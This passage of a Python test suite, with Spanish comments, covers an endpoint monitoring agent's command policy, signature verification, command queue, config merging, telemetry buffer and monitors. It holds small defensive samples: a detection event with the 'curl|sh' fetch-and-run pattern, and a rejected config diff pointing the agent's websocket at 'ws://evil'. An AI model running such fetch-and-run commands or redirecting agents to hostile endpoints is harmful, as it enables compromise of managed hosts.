"""Pruebas de las piezas principales: protocolo, política, cola, JWT, logger, obs."""

from __future__ import annotations

import os
import json
import platform
import signal
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import MagicMock, patch

ROOT = Path(__file__).resolve().parents[1]
SERVER = ROOT / "server"
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(SERVER))

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ed25519, padding, rsa

from colsoft_tools.config_manager import load_config, validate_config_diff
from colsoft_tools.obs_monitors import AlertEngine, ProcessWatcher
from colsoft_tools.observability import run_health_probes
from colsoft_tools.protocol import (
    COMMAND_ALIASES,
    LONG_RUNNING_COMMANDS,
    is_expired,
    make_command_request,
    make_event_push,
    parse_iso,
    resolve_command,
    command_result_failed,
)
from colsoft_tools.security import (
    COMMAND_RISK,
    DEFAULT_DISABLED,
    CommandPolicy,
    RateLimiter,
    command_canonical,
    command_timeout,
    resolve_script_from_catalog,
    script_catalog_canonical,
    sign_command_ed25519,
    verify_command_signature,
    verify_rsa_challenge,
)
from colsoft_tools.telemetry_buffer import TelemetryBuffer
from command_queue import CommandQueue
from lib.jwt_auth import decode_robin_jwt, issued_by_from_jwt, jwt_can_issue_command
from lib.metrics_logger import (
    ADMIN_TOOLS as LOG_ADMIN,
    NETWORK_TOOLS as LOG_NET,
    OBSERVABILITY_TOOLS as LOG_OBS,
    REMEDIATION_TOOLS as LOG_REM,
    SECURITY_TOOLS as LOG_SEC,
    LogsQueryError,
    _clean_logs_params,
    _ingest_url,
    _normalize_level,
    fetch_logs,
    log_event_push,
    log_tool_execution,
    query_url,
    tool_category,
    tool_target_summary,
)

# Catálogos del agente embebido (fuente de verdad de tools ejecutables).
from ws_tools_client_embedded import ALLOWED_TOOLS, NETWORK_TOOLS, OBSERVABILITY_TOOLS  # noqa: E402
from ws_tools_client_embedded import ADMIN_TOOLS, REMEDIATION_TOOLS, SECURITY_TOOLS  # noqa: E402


def _ed25519_pair() -> tuple[str, str]:
    key = ed25519.Ed25519PrivateKey.generate()
    priv = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()
    pub = key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()
    return priv, pub


def _rsa_pair():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv = key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()
    pub = key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()
    return key, priv, pub


class TestProtocol(unittest.TestCase):
    def test_aliases_resolve_to_allowed_tools(self):
        for src, dst in COMMAND_ALIASES.items():
            self.assertIn(dst, ALLOWED_TOOLS, f"{src} → {dst} no está en ALLOWED_TOOLS")

    def test_every_allowed_tool_has_risk(self):
        missing = ALLOWED_TOOLS - set(COMMAND_RISK)
        self.assertFalse(missing, f"sin COMMAND_RISK: {sorted(missing)}")

    def test_command_result_failed_mapping(self):
        self.assertTrue(command_result_failed({"status": "ERROR"}))
        self.assertTrue(command_result_failed({"status": "UNSUPPORTED"}))
        self.assertTrue(command_result_failed({"status": "error"}))
        self.assertFalse(command_result_failed({"status": "DOWN"}))
        self.assertFalse(command_result_failed({"status": "EMPTY"}))
        self.assertFalse(command_result_failed({"status": "OK", "down": 2}))
        self.assertFalse(command_result_failed({"status": "OK"}))
        self.assertFalse(command_result_failed({"status": "UP", "success": True}))
        self.assertFalse(command_result_failed(None))

    def test_failed_ws_status_maps_to_queue_failed(self):
        from colsoft_tools.protocol import CMD_FAILED, STATUS_ERROR, STATUS_FAILED
        from connection_manager import RESP_TO_STATE

        self.assertEqual(RESP_TO_STATE[STATUS_FAILED], CMD_FAILED)
        self.assertEqual(RESP_TO_STATE[STATUS_ERROR], CMD_FAILED)

    def test_long_running_includes_slow_collectors(self):
        for name in (
            "traceroute",
            "windows_event_log",
            "windows_wmi",
            "windows_etw",
            "installed_software",
            "linux_auditd",
            "linux_packages",
            "linux_syslog",
            "linux_ebpf",
            "linux_netlink",
            "windows_sysmon",
            "persistence_scan",
            "detection_scan",
        ):
            self.assertIn(name, LONG_RUNNING_COMMANDS)

    def test_make_command_request_fields(self):
        msg = make_command_request(
            "ping",
            {"target": "8.8.8.8"},
            agent_id="agt_1",
            tenant_id="t1",
            issued_by="user:abc",
        )
        self.assertEqual(msg["type"], "command_request")
        self.assertEqual(msg["command"], "ping")
        self.assertEqual(msg["agent_id"], "agt_1")
        self.assertEqual(msg["tenant_id"], "t1")
        self.assertTrue(msg["message_id"])
        self.assertTrue(parse_iso(msg["issued_at"]))
        self.assertTrue(parse_iso(msg["expires_at"]))
        self.assertTrue(is_expired("not-a-date"))
        self.assertTrue(is_expired(None))
        self.assertTrue(is_expired(""))

    def test_event_push_and_expiry(self):
        push = make_event_push("agt_1", {"event_type": "alert.threshold"}, tenant_id="t1")
        self.assertEqual(push["type"], "event_push")
        self.assertEqual(push["tenant_id"], "t1")
        past = (datetime.now(timezone.utc) - timedelta(seconds=5)).isoformat()
        future = (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat()
        self.assertTrue(is_expired(past))
        self.assertFalse(is_expired(future))
        self.assertTrue(is_expired(None))


class TestPolicyAndCatalogs(unittest.TestCase):
    def test_high_risk_denied_by_default(self):
        pol = CommandPolicy({"policy": {"allowed_commands": [], "allow_high_risk": False}})
        ok, reason = pol.check("kill_process")
        self.assertFalse(ok)
        self.assertIn("deshabilitado", reason)
        ok, _ = pol.check("ping")
        self.assertTrue(ok)
        ok, reason = pol.check("restart_service")
        self.assertFalse(ok)
        ok, reason = pol.check("not_a_real_tool")
        self.assertFalse(ok)
        self.assertIn("desconocido", reason)

    def test_high_risk_flag_alone_does_not_enable(self):
        pol = CommandPolicy({"policy": {"allowed_commands": [], "allow_high_risk": True}})
        self.assertFalse(pol.check("kill_process")[0])
        self.assertTrue(pol.check("ping")[0])

    def test_service_allowlist_does_not_require_high_risk_flag(self):
        pol = CommandPolicy(
            {"policy": {"allowed_commands": ["restart_service"], "allow_high_risk": False}}
        )
        self.assertTrue(pol.check("restart_service")[0])
        self.assertFalse(pol.check("kill_process")[0])
        self.assertFalse(pol.check("start_service")[0])

    def test_high_risk_with_flag_and_service_allowlist(self):
        pol = CommandPolicy(
            {
                "policy": {
                    "allowed_commands": ["restart_service", "kill_process"],
                    "allow_high_risk": True,
                }
            }
        )
        self.assertTrue(pol.check("kill_process")[0])
        self.assertTrue(pol.check("restart_service")[0])
        self.assertFalse(pol.check("start_service")[0])
        self.assertFalse(pol.check("ping")[0])

    def test_backend_does_not_gate_services_with_high_risk_env(self):
        import connection_manager as cm

        with patch.object(cm, "ALLOWED_HIGH_RISK", set()):
            self.assertFalse(cm.backend_command_forbidden("restart_service"))
            self.assertTrue(cm.backend_command_forbidden("kill_process"))
            self.assertTrue(cm.backend_command_forbidden("restore_isolation"))
            self.assertFalse(cm.backend_command_forbidden("ping"))
        with patch.object(cm, "ALLOWED_HIGH_RISK", {"kill_process"}):
            self.assertFalse(cm.backend_command_forbidden("kill_process"))
            self.assertTrue(cm.backend_command_forbidden("isolate_host"))
            self.assertTrue(cm.backend_command_forbidden("collect_file"))
            self.assertTrue(cm.backend_command_forbidden("restore_isolation"))

    def test_register_connection_requires_stable_agent_id(self):
        import connection_manager as cm

        mgr = cm.ConnectionManager()

        class _Client:
            host = "10.0.0.8"

        class _WS:
            client = _Client()

        with self.assertRaises(ValueError):
            mgr.register_connection(_WS(), "")
        aid = mgr.register_connection(
            _WS(),
            "PC_Linux_Test",
            client_name="PC_Linux_Test",
            tenant_id="t1",
        )
        self.assertEqual(aid, "PC_Linux_Test")
        self.assertIn("PC_Linux_Test", mgr.active_connections)
        self.assertEqual(mgr.agent_metadata["PC_Linux_Test"]["tenant_id"], "t1")
        mgr.disconnect("PC_Linux_Test")
        self.assertNotIn("PC_Linux_Test", mgr.active_connections)

    def test_is_agent_online_requires_recent_heartbeat(self):
        import connection_manager as cm
        from datetime import datetime, timedelta, timezone

        mgr = cm.ConnectionManager()

        class _Client:
            host = "10.0.0.8"

        class _WS:
            client = _Client()

            @property
            def client_state(self):
                from starlette.websockets import WebSocketState

                return WebSocketState.CONNECTED

        ws = _WS()
        mgr.register_connection(ws, "PC_Linux_Test", client_name="PC_Linux_Test")
        self.assertTrue(mgr.is_agent_online("PC_Linux_Test"))

        stale = datetime.now(timezone.utc) - timedelta(
            seconds=cm.AGENT_LIVENESS_SECONDS + 5
        )
        mgr.agent_metadata["PC_Linux_Test"]["last_seen"] = stale.isoformat()
        self.assertFalse(mgr.is_agent_online("PC_Linux_Test"))

        removed = mgr.prune_stale_connections()
        self.assertEqual(removed, ["PC_Linux_Test"])
        self.assertNotIn("PC_Linux_Test", mgr.active_connections)

    def test_agent_shutdown_and_instance_lock(self):
        import ws_tools_client_embedded as client

        shutdown = client.AgentShutdown()
        self.assertFalse(shutdown.requested)
        shutdown.request(signal.SIGTERM)
        self.assertTrue(shutdown.requested)

        self.assertFalse(client._pid_alive(99999999))
        lock_path = os.path.join(tempfile.mkdtemp(), "PC_Linux_Test.pid")
        lock = client.AgentInstanceLock(lock_path)
        lock.acquire()
        self.assertTrue(os.path.isfile(lock_path))
        lock.release()
        self.assertFalse(os.path.isfile(lock_path))

    def test_timeout_traceroute_override(self):
        self.assertGreaterEqual(command_timeout("traceroute"), 120.0)
        self.assertGreaterEqual(command_timeout("linux_packages"), 60.0)
        self.assertGreaterEqual(command_timeout("installed_software"), 90.0)
        self.assertGreaterEqual(command_timeout("windows_sysmon"), 60.0)
        self.assertGreaterEqual(command_timeout("persistence_scan"), 60.0)
        self.assertGreaterEqual(command_timeout("windows_wmi"), 60.0)
        self.assertGreaterEqual(command_timeout("collect_file"), 90.0)
        self.assertGreaterEqual(command_timeout("run_script"), 120.0)
        self.assertEqual(command_timeout("ping", {"timeout": 12}), 12.0)
        self.assertEqual(command_timeout("ping", {"timeout_ms": 12000}), 12.0)

    def test_event_envelope_schema_version(self):
        from colsoft_tools.event_model import SCHEMA_VERSION, normalize_event

        ev = normalize_event(
            {
                "event_type": "security.detection",
                "pid": 7,
                "name": "bash",
                "cmdline": "curl|sh",
                "rule_id": "SEC-002",
                "technique": "T1059.004",
            },
            agent_id="agt_1",
            tenant_id="t1",
        )
        self.assertEqual(ev["schema_version"], SCHEMA_VERSION)
        self.assertEqual(ev["agent_id"], "agt_1")
        self.assertEqual(ev["tenant_id"], "t1")
        self.assertIn("hostname", ev["host"])
        self.assertEqual(ev["process"]["pid"], 7)
        self.assertEqual(ev["detection"]["rule_id"], "SEC-002")
        audit = normalize_event(
            {
                "event_type": "linux.audit",
                "pid": "4521",
                "comm": "bash",
                "exe": "/usr/bin/bash",
            }
        )
        self.assertEqual(audit["process"]["name"], "bash")
        self.assertEqual(audit["process"]["command_line"], "/usr/bin/bash")
        push = make_event_push("agt_1", {"event_type": "alert.threshold"}, tenant_id="t1")
        self.assertEqual(push["event"]["schema_version"], SCHEMA_VERSION)
        self.assertEqual(push["event"]["agent_id"], "agt_1")

    def test_envelope_includes_empty_tenant_id(self):
        from colsoft_tools.data_plane import compact_event_for_otlp
        from colsoft_tools.event_model import SCHEMA_VERSION, normalize_event

        ev = normalize_event({"event_type": "alert.threshold"})
        self.assertEqual(ev["tenant_id"], "")
        push = make_event_push("agt_1", {"event_type": "alert.threshold"})
        self.assertEqual(push["tenant_id"], "")
        self.assertEqual(push["event"]["tenant_id"], "")
        compact = compact_event_for_otlp(
            {
                "schema_version": SCHEMA_VERSION,
                "event_type": "service.changed",
                "tool": "service_watch",
                "tenant_id": "",
            }
        )
        self.assertEqual(compact["schema_version"], SCHEMA_VERSION)
        self.assertIn("tenant_id", compact)

    def test_default_disabled_matches_alto_critico(self):
        for cmd in DEFAULT_DISABLED:
            self.assertIn(COMMAND_RISK[cmd], ("alto", "critico"), cmd)

    def test_client_and_logger_families_match(self):
        self.assertEqual(NETWORK_TOOLS, LOG_NET)
        self.assertEqual(OBSERVABILITY_TOOLS, LOG_OBS)
        self.assertEqual(REMEDIATION_TOOLS, LOG_REM)
        self.assertEqual(ADMIN_TOOLS, LOG_ADMIN)
        self.assertEqual(SECURITY_TOOLS, LOG_SEC)
        self.assertEqual(tool_category("tcp_check"), "network_check")
        self.assertEqual(tool_category("http_check"), "network_check")
        self.assertEqual(tool_category("tls_check"), "network_check")
        self.assertEqual(resolve_command("http_check"), "http_get")
        self.assertEqual(resolve_command("tls_check"), "tls")
        self.assertEqual(tool_category("get_system_log"), "observability")
        self.assertEqual(tool_category("isolate_host"), "remediation")
        self.assertEqual(tool_category("restore_isolation"), "remediation")
        self.assertEqual(tool_category("health_check"), "agent_admin")
        self.assertEqual(tool_category("fim_scan"), "security")
        self.assertEqual(tool_category("get_cis_score"), "security")
        self.assertEqual(tool_category("windows_event_log"), "windows")
        self.assertEqual(tool_category("linux_ebpf"), "linux")
        self.assertEqual(tool_category("linux_lsm"), "security")
        self.assertEqual(tool_category("windows_sysmon"), "security")
        self.assertEqual(tool_category("process_watch"), "observability")
        self.assertEqual(tool_category("alerts"), "observability")


class TestSecurityCrypto(unittest.TestCase):
    def test_ed25519_sign_verify_and_tamper(self):
        priv, pub = _ed25519_pair()
        canonical = command_canonical(
            "mid-1", "agt_1", "ping", {"target": "1.1.1.1"}, "user:x", "t0", "t1"
        )
        sig = sign_command_ed25519(priv, canonical)
        self.assertTrue(verify_command_signature(pub, canonical, sig))
        self.assertFalse(verify_command_signature(pub, canonical + "x", sig))
        other = command_canonical(
            "mid-1", "agt_1", "ping", {"target": "8.8.8.8"}, "user:x", "t0", "t1"
        )
        self.assertFalse(verify_command_signature(pub, other, sig))

    def test_rsa_challenge(self):
        key, _priv, pub = _rsa_pair()
        challenge = os.urandom(32)
        sig = key.sign(challenge, padding.PKCS1v15(), hashes.SHA256())
        import base64

        b64 = base64.b64encode(sig).decode()
        self.assertTrue(verify_rsa_challenge(pub, challenge, b64))
        self.assertFalse(verify_rsa_challenge(pub, b"nope", b64))

    def test_rate_limiter(self):
        rl = RateLimiter(limit=2, window=60.0)
        self.assertTrue(rl.allow("a"))
        self.assertTrue(rl.allow("a"))
        self.assertFalse(rl.allow("a"))
        self.assertTrue(rl.allow("b"))

    def test_script_catalog_requires_hash_and_signature(self):
        priv, pub = _ed25519_pair()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "cleanup.sh")
            with open(path, "w", encoding="utf-8") as f:
                f.write("#!/bin/sh\necho ok\n")
            with open(path, "rb") as f:
                digest = __import__("hashlib").sha256(f.read()).hexdigest()
            canonical = script_catalog_canonical("cleanup", path, digest)
            sig = sign_command_ed25519(priv, canonical)
            cfg = {
                "signing_public_key": pub,
                "scripts_catalog": {
                    "cleanup": {
                        "path": path,
                        "sha256": digest,
                        "signature": sig,
                    },
                    "legacy": path,
                },
            }
            self.assertEqual(resolve_script_from_catalog(cfg, "cleanup"), path)
            self.assertIsNone(resolve_script_from_catalog(cfg, "legacy"))
            cfg["scripts_catalog"]["cleanup"]["sha256"] = "00" * 32
            self.assertIsNone(resolve_script_from_catalog(cfg, "cleanup"))


class TestCommandQueue(unittest.TestCase):
    def test_enqueue_dedup_and_expire(self):
        with tempfile.TemporaryDirectory() as tmp:
            q = CommandQueue(persist_dir=tmp)
            rec = q.enqueue("agt", "ping", {}, issued_by="user:1", timeout=30)
            mid = rec["message_id"]
            again = q.enqueue(
                "agt", "ping", {}, issued_by="user:1", timeout=30, message_id=mid
            )
            self.assertEqual(again["message_id"], mid)
            self.assertEqual(len(q.list_for_agent("agt")), 1)
            rec["expires_at"] = (
                datetime.now(timezone.utc) - timedelta(seconds=1)
            ).isoformat()
            self.assertTrue(q.is_record_expired(rec))
            expired = q.expire(rec)
            self.assertEqual(expired["state"], "expired")
            q2 = CommandQueue(persist_dir=tmp)
            self.assertEqual(q2.get(mid)["state"], "expired")


class TestConfigAndBuffer(unittest.TestCase):
    def test_load_config_client(self):
        cfg, errs, path = load_config(str(ROOT / "config_client.json"))
        self.assertEqual(errs, [])
        self.assertTrue(cfg.get("client_name"))
        self.assertTrue((path or "").endswith("config_client.json"))
        self.assertTrue(isinstance(cfg.get("policy"), dict))

    def test_enrollment_merges_identity_over_disk_config(self):
        from colsoft_tools.enrollment import (
            DEFAULT_MAX_COMMAND_RATE,
            merge_runtime_config,
        )

        disk = {
            "scheduler": {"tools": ["system_metrics"], "interval_seconds": 60},
            "max_command_rate": 20,
            "linux": {"auditd": {"enabled": True}},
            "websocket_url": "ws://lab",
        }
        bundle = {
            "agent_id": "agt_1",
            "websocket_url": "wss://prod/ws/colsoft-tools",
            "signing_public_key": "-----BEGIN PUBLIC KEY-----\nM\n-----END PUBLIC KEY-----",
        }
        cfg = merge_runtime_config(disk, bundle)
        self.assertEqual(cfg["agent_id"], "agt_1")
        self.assertEqual(cfg["websocket_url"], "wss://prod/ws/colsoft-tools")
        self.assertEqual(cfg["scheduler"]["tools"], ["system_metrics"])
        self.assertEqual(cfg["max_command_rate"], 20)
        self.assertTrue(cfg["linux"]["auditd"]["enabled"])
        polluted = merge_runtime_config(
            disk,
            {
                "agent_id": "agt_3",
                "scheduler": {"tools": []},
                "linux": {"auditd": {"enabled": False}},
                "max_command_rate": 99,
            },
        )
        self.assertEqual(polluted["agent_id"], "agt_3")
        self.assertEqual(polluted["scheduler"]["tools"], ["system_metrics"])
        self.assertTrue(polluted["linux"]["auditd"]["enabled"])
        self.assertEqual(polluted["max_command_rate"], 20)
        fallback = merge_runtime_config({}, {"agent_id": "agt_2"})
        self.assertEqual(fallback["max_command_rate"], DEFAULT_MAX_COMMAND_RATE)
        self.assertEqual(fallback["scheduler"], {})
        hardened = merge_runtime_config(
            {"allow_insecure_ws": True, "websocket_url": "ws://lab"},
            {
                "agent_id": "agt_h",
                "websocket_url": "wss://prod/ws/colsoft-tools",
                "tls_client_cert": "enrollment/certs/agent.crt",
                "tls_client_key": "enrollment/certs/agent.key",
            },
        )
        self.assertFalse(hardened["allow_insecure_ws"])
        lab = merge_runtime_config(
            {"allow_insecure_ws": False, "websocket_url": "wss://x"},
            {
                "agent_id": "agt_l",
                "websocket_url": "ws://lab/ws/colsoft-tools",
                "allow_insecure_ws": True,
            },
        )
        self.assertTrue(lab["allow_insecure_ws"])
        self.assertTrue(lab["websocket_url"].startswith("ws://"))

    def test_protected_keys_rejected_in_diff(self):
        _norm, errs = validate_config_diff({"allow_insecure_ws": True})
        self.assertTrue(errs)
        _norm, errs = validate_config_diff({"websocket_url": "ws://evil"})
        self.assertTrue(errs)
        _norm, errs = validate_config_diff(
            {"data_plane": {"insecure": True, "endpoint": "http://127.0.0.1:4318"}}
        )
        self.assertTrue(errs)
        _norm, errs = validate_config_diff({"heartbeat_interval": 10})
        self.assertFalse(errs)
        _norm, errs = validate_config_diff({"max_chars": 12000})
        self.assertFalse(errs)

    def test_update_config_accepts_srs_config_diff(self):
        from colsoft_tools.agent_admin import update_config
        from colsoft_tools.tool_catalog import tool_target_summary

        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "config_client.json")
            with open(path, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "client_name": "n",
                        "agent_id": "a",
                        "heartbeat_interval": 30,
                    },
                    f,
                )
            missing = update_config({}, path, {})
            self.assertEqual(missing["status"], "ERROR")
            self.assertIn("config_diff", missing["error"])
            ok = update_config(
                {}, path, {"config_diff": {"heartbeat_interval": 45}}
            )
            self.assertEqual(ok["status"], "OK")
            self.assertIn("heartbeat_interval", ok["applied"])
            saved = json.loads(Path(path).read_text(encoding="utf-8"))
            self.assertEqual(saved["heartbeat_interval"], 45)
            via_diff = update_config(
                {}, path, {"diff": {"heartbeat_interval": 50}}
            )
            self.assertEqual(via_diff["status"], "OK")
        self.assertIn("heartbeat_interval", tool_target_summary(
            "update_config", {"config_diff": {"heartbeat_interval": 12}}
        ))

    def test_env_example_high_risk_matches_default_disabled(self):
        text = (ROOT / ".env.example").read_text(encoding="utf-8")
        line = ""
        for raw in text.splitlines():
            if raw.startswith("ALLOW_HIGH_RISK_COMMANDS="):
                line = raw.split("=", 1)[1].strip()
                break
        listed = {c.strip() for c in line.split(",") if c.strip()}
        self.assertEqual(listed, set(DEFAULT_DISABLED))
        self.assertNotIn("start_service", listed)
        self.assertNotIn("restart_service", listed)

    def test_telemetry_buffer_put_take(self):
        with tempfile.TemporaryDirectory() as tmp:
            buf = TelemetryBuffer(tmp, max_events=10, max_age_days=1.0)
            buf.put({"event_type": "t", "n": 1})
            self.assertEqual(buf.count(), 1)
            batch = buf.take(1)
            self.assertEqual(batch[0]["n"], 1)
            self.assertEqual(buf.count(), 0)

    def test_telemetry_buffer_fifo_across_rotate_and_restore(self):
        with tempfile.TemporaryDirectory() as tmp:
            buf = TelemetryBuffer(
                tmp,
                max_events=0,
                max_age_days=1.0,
                max_file_bytes=1024,
                max_total_bytes=1024 * 1024,
            )
            for i in range(40):
                buf.put({"n": i, "pad": "x" * 80})
            self.assertGreater(buf.count(), 0)
            jsonl = [n for n in os.listdir(tmp) if n.endswith(".jsonl")]
            self.assertGreaterEqual(len(jsonl), 2)
            first = buf.take(5)
            self.assertEqual([e["n"] for e in first], [0, 1, 2, 3, 4])
            buf.restore(first)
            again = buf.take(3)
            self.assertEqual([e["n"] for e in again], [0, 1, 2])

    def test_telemetry_buffer_prunes_by_total_bytes(self):
        with tempfile.TemporaryDirectory() as tmp:
            buf = TelemetryBuffer(
                tmp,
                max_events=0,
                max_age_days=7.0,
                max_file_bytes=1024,
                max_total_bytes=4096,
            )
            for i in range(80):
                buf.put({"n": i, "pad": "y" * 120})
            total = 0
            for name in os.listdir(tmp):
                if name.endswith(".jsonl"):
                    total += os.path.getsize(os.path.join(tmp, name))
            self.assertLessEqual(total, 4096 + 1024)
            self.assertGreater(buf.count(), 0)


class TestScheduler(unittest.TestCase):
    def test_run_once_enabled_without_interval(self):
        from colsoft_tools.scheduler import AgentScheduler
        from colsoft_tools.security import CommandPolicy

        periodic = AgentScheduler(
            {"minute_interval": 0, "tools_execution_interval": ["system_metrics"]},
            execute=lambda *a, **k: None,
            sink=lambda e: None,
            policy=CommandPolicy({}),
        )
        self.assertFalse(periodic.enabled())

        once = AgentScheduler(
            {
                "minute_interval": 0,
                "tools_execution_interval": [
                    {"tool": "hardware_inventory"},
                    {"tool": "installed_software"},
                ],
                "scheduler": {"run_once": True},
            },
            execute=lambda *a, **k: None,
            sink=lambda e: None,
            policy=CommandPolicy({}),
        )
        self.assertTrue(once.enabled())
        self.assertTrue(once.status()["run_once"])

    def test_nested_scheduler_wins_over_aliases(self):
        from colsoft_tools.scheduler import AgentScheduler, items_from_config, interval_seconds
        from colsoft_tools.security import CommandPolicy

        cfg = {
            "minute_interval": 5,
            "tools_execution_interval": ["disk_usage"],
            "scheduler": {
                "interval_seconds": 60,
                "tools": [{"tool": "system_metrics"}],
            },
        }
        self.assertEqual(interval_seconds(cfg), 60.0)
        self.assertEqual(
            interval_seconds(
                {"scheduler": {"interval_minutes": 2, "tools": ["ping"]}}
            ),
            120.0,
        )
        self.assertEqual(
            interval_seconds(
                {
                    "scheduler": {
                        "interval_seconds": 15,
                        "interval_minutes": 99,
                        "tools": ["ping"],
                    }
                }
            ),
            15.0,
        )
        self.assertEqual(items_from_config(cfg), [("system_metrics", {})])
        nested = AgentScheduler(
            cfg,
            execute=lambda *a, **k: None,
            sink=lambda e: None,
            policy=CommandPolicy({}),
        )
        self.assertTrue(nested.enabled())
        self.assertEqual(nested.status()["interval_s"], 60.0)
        self.assertEqual(nested.status()["tools"], 1)

    def test_run_resolves_srs_alias_and_category(self):
        import asyncio
        from colsoft_tools.scheduler import AgentScheduler
        from colsoft_tools.security import CommandPolicy

        executed = []
        events = []

        async def execute(tool, params, **kwargs):
            executed.append(tool)
            return {"tool": tool, "status": "OK"}

        sched = AgentScheduler(
            {
                "scheduler": {
                    "run_once": True,
                    "tools": [
                        {"tool": "get_system_log"},
                        {"tool": "ping"},
                    ],
                }
            },
            execute=execute,
            sink=events.append,
            policy=CommandPolicy({}),
        )
        asyncio.run(sched.run())
        self.assertEqual(executed, ["system_log", "ping"])
        self.assertEqual(events[0]["tool"], "system_log")
        self.assertEqual(events[0]["category"], "observability")
        self.assertEqual(events[1]["category"], "network_check")


class TestObservability(unittest.TestCase):
    def test_http_probe_builds_url_from_host_port(self):
        out = run_health_probes(
            [
                {
                    "id": "lab",
                    "type": "http",
                    "host": "127.0.0.1",
                    "port": 1,
                    "timeout": 1,
                }
            ]
        )
        self.assertEqual(out["status"], "OK" if out["down"] == 0 else "DOWN")
        rec = out["checks"][0]
        self.assertEqual(rec["url"], "http://127.0.0.1:1/")
        self.assertIn(rec["status"], ("UP", "DOWN"))

    def test_process_watch_and_alerts(self):
        watcher = ProcessWatcher(interval_seconds=1)
        self.assertEqual(watcher.tick({"a": {"pid": 1, "name": "x"}}), [])
        created = watcher.tick(
            {
                "a": {"pid": 1, "name": "x"},
                "b": {"pid": 2, "name": "y"},
            }
        )
        self.assertTrue(any(e["event_type"] == "process.created" for e in created))
        exited = watcher.tick({"b": {"pid": 2, "name": "y"}})
        self.assertTrue(any(e["event_type"] == "process.exited" for e in exited))

        engine = AlertEngine(
            [{"id": "cpu", "metric": "cpu.percent", "op": "gt", "threshold": 50}],
            cooldown_seconds=0,
        )
        fire = engine.evaluate({"cpu": {"percent": 90}})
        clear = engine.evaluate({"cpu": {"percent": 10}})
        self.assertTrue(any(e["event_type"] == "alert.threshold" for e in fire))
        self.assertTrue(any(e["event_type"] == "alert.cleared" for e in clear))

        from colsoft_tools.observability import metric_from_snapshot

        linux_snap = {
            "cpu": {"percent": 12},
            "memory": {"total": 1000, "available": 250, "percent": 75},
            "network_io": [
                {"iface": "eth0", "rx_bytes": 10, "tx_bytes": 20},
                {"iface": "eth1", "rx_bytes": 1, "tx_bytes": 2},
            ],
        }
        self.assertEqual(metric_from_snapshot(linux_snap, "memory.used"), 750.0)
        self.assertEqual(metric_from_snapshot(linux_snap, "network_io.bytes_sent"), 22.0)
        self.assertEqual(metric_from_snapshot(linux_snap, "network_io.bytes_recv"), 11.0)
        self.assertEqual(metric_from_snapshot(linux_snap, "network.bytes_sent"), 22.0)
        self.assertEqual(metric_from_snapshot(linux_snap, "network.bytes_recv"), 11.0)
        win_snap = {
            "cpu": {"percent": 8, "load_avg_1_5_15": [0.5, 0.4, 0.3]},
            "network_io": {"bytes_sent": 9, "bytes_recv": 3},
        }
        self.assertEqual(metric_from_snapshot(win_snap, "cpu.load1"), 0.5)
        self.assertEqual(metric_from_snapshot(win_snap, "cpu.load_avg_1"), 0.5)
        self.assertEqual(metric_from_snapshot(win_snap, "network.bytes_sent"), 9.0)

    def test_alerts_respects_enabled_false(self):
        from colsoft_tools.obs_monitors import spawn_obs_tasks

        tasks = spawn_obs_tasks(
            {
                "alerts": {
                    "enabled": False,
                    "rules": [
                        {
                            "id": "cpu",
                            "metric": "cpu.percent",
                            "op": "gt",
                            "threshold": 1,
                        }
                    ],
                }
            },
            sink=lambda e: None,
        )
        self.assertEqual(tasks, [])

    def test_service_watcher_baseline_then_state_and_add(self):
        from colsoft_tools.obs_monitors import ServiceWatcher, spawn_obs_tasks

        watcher = ServiceWatcher()
        baseline = {"sshd": {"unit": "sshd", "active": "running", "sub": "running"}}
        self.assertEqual(watcher.tick(baseline), [])
        stopped = {"sshd": {"unit": "sshd", "active": "stopped", "sub": "dead"}}
        events = watcher.tick(stopped)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["event_type"], "service.changed")
        self.assertEqual(events[0]["change"], "state")
        added = dict(stopped)
        added["cron"] = {"unit": "cron", "active": "running", "sub": "running"}
        created = watcher.tick(added)
        self.assertEqual(created[0]["change"], "added")
        self.assertEqual(created[0]["unit"], "cron")

        idle = spawn_obs_tasks(
            {"service_watch": {"enabled": False}}, sink=lambda e: None
        )
        self.assertEqual(idle, [])

    def test_result_summary_uses_catalog_names(self):
        from ws_tools_client_embedded import _result_summary

        http = _result_summary(
            "http_get", {"tool": "http_get", "status": "UP", "status_code": 200}
        )
        self.assertIn("200", http)
        tcp = _result_summary(
            "tcp_connect",
            {"tool": "tcp_connect", "status": "UP", "response_time": 0.01},
        )
        self.assertIn("UP", tcp)
        dns = _result_summary(
            "dns_resolve",
            {"tool": "dns_resolve", "status": "UP", "ips": ["1.1.1.1"]},
        )
        self.assertIn("ips=1", dns)
        svc = _result_summary(
            "service_status",
            {
                "tool": "service_status",
                "status": "OK",
                "service_name": "sshd",
                "active_state": "active",
                "sub_state": "running",
            },
        )
        self.assertIn("sshd", svc)
        self.assertIn("active", svc)
        block = _result_summary(
            "block_ip",
            {
                "tool": "block_ip",
                "status": "OK",
                "action": "block",
                "ip": "1.2.3.4",
                "direction": "in",
            },
        )
        self.assertIn("1.2.3.4", block)

    def test_linux_collectors_skip_psutil(self):
        if platform.system() != "Linux":
            self.skipTest("Linux /proc")
        from colsoft_tools.observability import (
            get_hardware_inventory,
            get_network_connections,
            get_process_list,
        )

        procs = get_process_list(limit=5)
        self.assertEqual(procs.get("status"), "OK")
        self.assertEqual(procs.get("source"), "/proc")
        self.assertGreaterEqual(procs.get("count") or 0, 1)
        hw = get_hardware_inventory()
        self.assertEqual(hw.get("status"), "OK")
        self.assertEqual(hw.get("source"), "/proc+/sys")
        self.assertIn("logical_cores", hw.get("cpu") or {})
        phys = (hw.get("cpu") or {}).get("physical_cores")
        if phys is not None:
